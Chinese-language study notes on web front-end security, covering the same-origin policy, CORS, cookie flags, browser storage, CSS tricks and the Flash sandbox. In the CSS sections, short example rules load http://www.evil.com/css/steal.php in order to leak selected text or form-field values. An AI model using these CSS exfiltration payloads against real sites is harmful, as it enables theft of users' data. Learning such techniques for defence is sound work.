#Web安全的关键点

##数据与指令
如果数据与指令之间能各司其职，那么Web世界就非常太平了. 当正常的数据内容被注入指令内容，在解释的过程中，如果注入的指令能够被 独立执行，那么攻击就发生了。  
##浏览器的同源策略
同源策略规定：不同域的客户端脚本在没明确授权的情况下，不能读写对方的资源。  

1. 同域要求两个站点同协议、同域名、同端口  
1. 客户端脚本主要指JavaScript（各个浏览器原生态支持的脚本语言）、ActionScript（Flash 的脚本语言），以及JavaScript与ActionScript都遵循的ECMAScript脚本标准  
1. 客户端也存 在授权现象，比如：HTML5新标准中提到关于AJAX跨域访问的情况，默认情况下是不允 许跨域访问的，只有目标站点明确返回HTTP响应头  
1. 读写权限:Web上的资源有很多，有的只有读权限，有的同时拥有读和写的权限。  
1. 一般来说，资源包括：HTTP消息头、整个DOM树、浏览器存储（如： Cookies、Flash Cookies、localStorage等  

##信任与信任关系
1. 安全类似木桶原理，短的那块板决定了木桶实际能装多少水。一个Web服务器，如果其上的网站没做好权限分离，没控制好信任关系，则整体安全性就由安全性最差的那个网站决定
1. 很多网站都嵌入了第三方的访问统计脚本，嵌入的方式是使用\<script\>标签引用，这时就等于建立了信任关系，如果第三方的统计脚本被黑客挂马，那么这些网站也都会被 危及

这种信任关系很普遍，服务器与服务器、网站与网站、Web服务的不同子域、Web层面与浏览器第三方插件、Web层面与浏览器特殊API、浏览器特殊API与本地文件系统、嵌入的Flash与当前DOM树、不同协议之间，等等  

##社会工程学的作用
常用的社工辅助技巧有：Google Hack、SNS垂直搜索、各种收集的数据库集合查询等。  

##攻防不单一
一次完整的渗透会利用到多种攻击手法  

##场景很重要

-------------------------------------------------

#前端基础

##W3C的世界法则
W3C即万维网联盟（http://www.w3.org/），它制定了很多推荐标准，比如：HTML、XML、JavaScript、CSS等，是这些标准让这个Web世界变得标准和兼容。

##URL
通过URL请求可以查 找到唯一的资源  
URL有个重点就是编码方式，有三类：escape、encodeURI、encodeURIComponent， 对应的解码函数是：unescape、decodeURI、decodeURIComponent。这三个编码函数是有差异的，甚至浏览器在自动URL编码中也存在差异。  

##HTTP协议
URL的请求协议几乎都是HTTP，它是一种无状态的请求响应，即每次的请求响应之后，连接会立即断开或延时断开（保持一定的连接有效期），断开后，下一次请求再重新建立

##松散的HTML世界
> 为什么说HTML的世界是松散的？我们知道，HTML是由众多标签组成的，标签内还有对应的各种属性。这些标签可以不区分大小写，有的可以不需要闭合。属性的值可以用单引号、双引号、反单引号包围住，甚至不需要引号。多余的空格与Tab毫不影响HTML的解析。HTML里可以内嵌CSS、JavaScript等内容，而不强调分离，等等  
> 松散有松散的好处，但这样却培养出了一种惰性，很多前端安全问题就是因为松散导致的。  

###DOM树
我们的隐私数据可能存储在以下位置：  

* HTML内容中；
* 浏览器本地存储中，如Cookies等；
* URL地址中。

###iframe 内嵌出一个开放的世界
iframe标签带来了很多便利，同时也带来了很多风险  
如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow来操作子页的DOM树，同理，子页可以调用父页的contentWindow来操作父页的DOM树。如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location值进行写操作，这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权限，这样就不能获取到父页location URL的内容，否则有可能会造成隐私数据泄漏，比如，有的网站将身份认证token存在于URL中。  

###HTML内嵌脚本执行
JavaScript脚本除了出现在JS格式文件里，被嵌入而执行外，还可以出现在HTML的\<script\>\</script\>标签内、HTML的标签on事件中，以及一些标签的href、src等属性的伪协议（javascript:等）中  
这样导致防御XSS变得有些棘手，出现在DOM树的不同位置，面对的防御方案都不太一样  


##跨站之魂——JavaScript
对跨站师来说，大多数情况下，有了XSS漏洞，就意味着可以注入任意的JavaScript，有了JavaScript，就意味着被攻击者的任何操作都可以模拟，任何隐私信息都可以获取到。可以说，JavaScript就是跨站之魂  

###DOM树操作
1．获取HTML内容中的隐私数据
1. 获取浏览器的Cookies数据

    Cookies中保存了用户的会话信息，通过document.cookie 可以获取到，不过并不是所有的Cookies都可以获取

1. 获取URL地址中的数据

    从window.location或location处可以获取URL地址中的数据。  

###AJAX风险
AJAX的核心对象是XMLHttpRequest（一般简称为xhr）， 不 过IE 7之前的浏览器不支持xhr对象，而是通过ActiveXObject来实现的。  
这里需要注意，不是任何请求头都可以通过JavaScript进行设置的，否则前端的逻辑世界就乱了，W3C给出了一份头部黑名单：  

* Accept-Charset
* Accept-Encoding
* Access-Control-Request-Headers
* Access-Control-Request-Method
* Connection
* Content-Length
* Cookie
* Cookie2
* Content-Transfer-Encoding
* Date
* Expect
* Host
* Keep-Alive
* Origin
* Referer
* TE
* Trailer
* Transfer-Encoding
* Upgrade 

> AJAX是严格遵守同源策略的，既不能从另一个域读取数据，也不能发送数据到另一个域.但是W3C的新标准中，CORS（Cross-Origin Resource Sharing）开始推进浏览器支持这样的跨域方案,过程如下:  

1. www.foo.com（来源域）的AJAX向www.evil.com（目标域）发起了请求，浏览器会给自动带上Origin头，如下：

    Origin: http://www.foo.com

1. 然后目标域要判断这个Origin值，如果是自己预期的，那么就返回：Access-Control-Allow-Origin: http://www.foo.com表示同意跨域。如果Access-Control-Allow-Origin之后是\*通配符，则表示任意域都可以往目标跨。如果目标域不这样做，浏览器获得响应后没发现Access-Control-Allow-Origin头的存在，就会报类似下面这样的权限错误： 

    XMLHttpRequest cannot load http://www.evil.com. Origin http://www.foo.com is not allowed by Access-Control-Allow-Origin.

如果目标域不设置Access-Control-Allow-Origin: http://www.foo.com,虽然浏览器会报权限错误的问题，但实际上隐私数据已经被 目标域的steal.php接收到了  
但是,默认情况下，这样的跨域无法带上目标域的会话（Cookies等），需要设置xhr实例的 withCredentials属性为true（IE还不支持）  

###模拟用户发起浏览器请求
在浏览器中，用户发出的请求基本上都是HTTP协议里的GET与POST方式。  
对于GET方式，实际上就是一个URL，方式有很多  
对于POST的请求，前面说的XMLHttpRequest对象就是一个非常方便的方式，可以模拟表单提交，它有异步与同步之分，差别在于XMLHttpRequst实例化的对象xhr的open方法的第三个参数，true 表示异步，false 表示同步，如果使用异步方式，就是AJAX。异步则表示请求发出去后，JavaScript可以去做其他事情，待响应回来后会自动触发xhr对象的onreadystatechange事件，可以监听这个事件以处理响应内容。同步则表示请求发出去后，JavaScript需要等待响应回来，这期间就进入阻塞阶段  

> POST表单提交的Content-Type为application/x-www-form-urlencoded，它是一种默认的标准格式  

除了可以通过xhr对象模拟表单提交外，还有一种比较原始的方式：form表单自提交。原理是通过JavaScript动态创建一个form，并设置好form中的每个input键值，然后对form对象做submit()操作即可

###Cookie安全
Cookie是一个神奇的机制，同域内浏览器中发出的任何一个请求都会带上Cookie，无论请求什么资源，请求时，Cookie出现在请求头的Cookie字段中  
> 服务端响应头的Set-Cookie字段可以添加、修改和删除Cookie，大多数情况下，客户端通过JavaScript也可以添加、修改和删除Cookie
`[name][value][domain][path][expires][httponly][secure]`  

1．子域Cookie机制

    这是domain字段的机制，设置Cookie时，如果不指定domain的值，默认就是本域  
    > 这个机制不允许设置Cookie的domain为下一级子域或其他外域  

1. 路径Cookie机制

    这是path字段的机制，设置Cookie时，如果不指定path的值，默认就是目标页面的路径  
    通过指定path字段，JavaScript有权限设置任意Cookie到任意路径下，但是只有目标路径下的页面JavaScript才能读取到该Cookie  
    > 不过可以通过**跨iframe进行DOM操作**跨路径读取Cookie,因此,设置Path不能防止重要的Cookie被盗取  


1. HttpOnly Cookie机制

    HttpOnly是指仅在HTTP层面上传输的Cookie，当设置了HttpOnly标志后，客户端脚本就无法读写该Cookie，这样能有效地防御XSS攻击获取Cookie  
    如果服务端响应的页面有Cookie调试信息，很可能就会导致HttpOnly Cookie的泄漏  

    1. PHP的phpinfo()信息
    1. Django应用的调试信息
    1. CVE-2012-0053关于Apache Http Server 400错误暴露HttpOnly Cookie

1. Secure Cookie机制

    Secure Cookie机制指的是设置了Secure标志的Cookie仅在HTTPS层面上安全传输，如果请求是HTTP的，就不会带上这个Cookie，这样能降低重要的Cookie被中间人截获的风险  

1. 本地Cookie与内存Cookie

    如果没设置过期时间，就是内存Cookie，这样 的Cookie会随着浏览器的关闭而从内存中消失；如果设置了过期时间是未来的某个时间点，那么这样的Cookie就会以文本形式保存在操作系统本地，待过期时间到了才会消失  
    实际上，攻击者可以给内存Cookie加一个过期时间，使其变为本地Cookie。用户账户是否安全与服务端校验有关，包括重要Cookie的唯一性（是否可预测）、完整性（是否被篡改了）、过期等校验  

1. Cookie的P3P性质

    HTTP响应头的P3P（Platform for Privacy Preferences Project）字段 是W3C公布的一项隐私保护推荐标准,该字段用于标识是否允许目标网站的Cookie被另一个域通过加载目标网站而设置或发送，仅IE执行了该策略  

###本地存储风险
* Cookie  也称HTTP Cookie，是最常见的方式，key-value模式
* UserData  IE自己的本地存储，key-value模式

    微软在IE 5.0以后，自定义了一种持久化用户数据的概念userData，用户数据的每个域最大为64KB

* localStorage  HTML5新增的本地存储，key-value模式，当前浏览器已开始支持，而且支持得非常好
* local Database HTML5新增的浏览器本地DataBase，是SQLite 数据库，WebKit内核浏览器（如Safari/Chrome）与Opera浏览器支持，可惜W3C已经废弃这个
* Flash Cookie  Flash的本地共享对象（LSO），key-value模式，跨浏览器

    Flash是跨浏览器的通用解决方案，Flash Cookie的默认存储数据大小是100KB

> 广为人知的evercookie,保存user ID和cookie data至不只是两个或三个地方，而是八个不同的地方

###E4X带来的混乱世界
E4X是ECMAScript For XML的缩写。本书的两大脚本JavaScript和ActionScript都遵循ECMAScript标准，所以在E4X的语法上是一致的  
通过使用E4X技术，可以混淆JavaScript代码，甚至绕开一些过滤规则。下面进一步了解E4X的使用  

###JavaScript函数劫持
JavaScript函数劫持很简单，一般情况下，只要在目标函数触发之前，重写这个函数即可  
> 我们知道，在一定程度上是可以自动化分析DOM XSS的，可以动态解密一些混淆的代码（如：网马），JSON HiJacking使用的就是这样的技巧。

##一个伪装出来的世界——CSS
CSS即层叠样式表，用于控制网页的呈现样式，如颜色、字体、大小、高宽、透明、偏移、布局等，通过灵活运用CSS技巧，攻击者可以伪装出期望的网页效果，从而进行钓鱼攻击  

###CSS伪类
a标签的4个伪类:  

* :link  有链接属性时
* :visited  链接被访问过
* :active  点击激活时
* :hover  鼠标移过时

> \#select::selection{background: url(http://www.evil.com/css/steal.php? data=selection);}

###CSS3的属性选择符
CSS3增加了属性选择符，利用属性选择符可以通过纯CSS猜测出目标input表单项的具体值
> input[value^="x"]{background: url(http://www.evil.com/css/steal.php?data=0x);  
> 如果value的值是ASCII码，要猜测出是x打头的，则最多需要请求127次。然后继续猜测第2个字符、第3个字符。这种技巧没有实战价值，不过其思路非常值得我们学习，这种攻击完全不需要JavaScript的参与  

##另一个幽灵——ActionScript
//这部分Fengrt看的时候没学过ActionScript,不能理解
ActionScript（简称AS）和JavaScript一样遵循ECMAScript标准。ActionScript由Flash的脚本虚拟机执行，运行环境就在Flash Player中，而Flash Player的运行环境主要有两个：浏览器与操作系统本地，Flash有自己的安全沙箱来限制ActionScript的能力，否则通过ActionScript可以进行很多危险的操作，这就是所谓的恶意Flash  

###Flash安全沙箱
安全沙箱包括远程沙箱与本地沙箱。其实这个沙箱模型类似于浏览器中的同源策略。在同一域内的资源会被放到一个安全组下，这个安全组被称为安全沙箱  

1. FlashPlayer 的权限控制

    1. 管理用户控制

        这指系统的最高权限用户，即Windows下的Administrator、Linux下的root等，它们有如下两种类型的控制:  

        * mms.cfg文件：数据加载、隐私控制、Flash Player更新、旧版文件支持、本地文件安全性、全屏模式等
        * “全局 Flash Player 信任”目录：当某些SWF文件被指定到这个受信任的目录下时，这些SWF 文件会被分配到受信任的本地沙箱

    1. 用户控制

        相对于管理用户来说，这里的用户是指普通用户，它有如下三种类型的控制  

        * 摄像头与麦克风设置；
        * 共享对象存储设置：Flash Cookies；
        * 相对于“全局 Flash Player 信任”目录，用户权限中也有一个“用户 Flash Player 信任”目录

    1. Web站点控制（跨域策略文件）

        Web站点控制就是家喻户晓的crossdomain.xml文件了，现在的安全策略是该文件默认只能存放在站点根目录下  
    
    1. 作者（开发人员）控制

        开发人员可以通过编码（在ActionScript脚本中）指定允许的安全控制权限

1. 安全沙箱

    Flash文件可以在我们的桌面环境下运行。如果没有一个很好的安全策略来限制这些功能不弱的ActionScript脚本，将是很危险的事  
    本地沙箱有以下三种类型:  

    1. 只能与本地文件系统内容交互的本地沙箱
    1. 只能与远程内容交互的本地沙箱
    1. 受信任的本地沙箱

###HTML嵌入Flash的安全相关配置
<object>的几个属性:  

1. allowNetworking

    该参数控制Flash文件的网络访问功能.它有三个值：all（所有的网络API都可用 ）、internal（默认值，除了不能使用浏览器导航和浏览器交互的API外，如navigateToURL、fscommand、ExternalInterface.call等，其他的都可用）、none（所有的网络API都不可用）。  

1. allowScriptAccess

    这是ActionScript与JavaScript通信的安全控制，AS3中主要是ExternalInterface对象的方法.有三个值：never（ExternalInterface的call方法不能与HTML的JS脚本进行通信 ）、sameDomain（同域内就可以，这是默认值）、always（允许所有的域，因此，比较危 险 ）  

1. allowFullScreen

    全屏模式的安全问题，这是一个Boolean值，默认为false，不允许Flash全屏。全屏带来的安全问题类似于界面伪装这类攻击  

###跨站Flash
跨站Flash也称Cross Site Flash（XSF），即通过ActionScript来加载第三方Flash文件，攻击者如果对这个过程可控，那么他们就可以让目标Flash加载恶意的Flash文件，从而造成XSF攻击。  

> HTML中的flashvars参数可以设置目标Flash的参数，如果这个HTML攻击者可以控制flashvars的值
> 如果AS2的Flash加载AS3的Flash，或者AS3的Flash加载AS2的Flash，会影响到被加载Flash的原本特性吗？除了受目标沙盒的影响，其他是不会的

###参数传递
信任不安全数据,使得攻击者可控参数,可能导致安全问题  

###Flash里的内嵌HTML

###与JavaScript通信


---------------------------

#漏洞挖掘



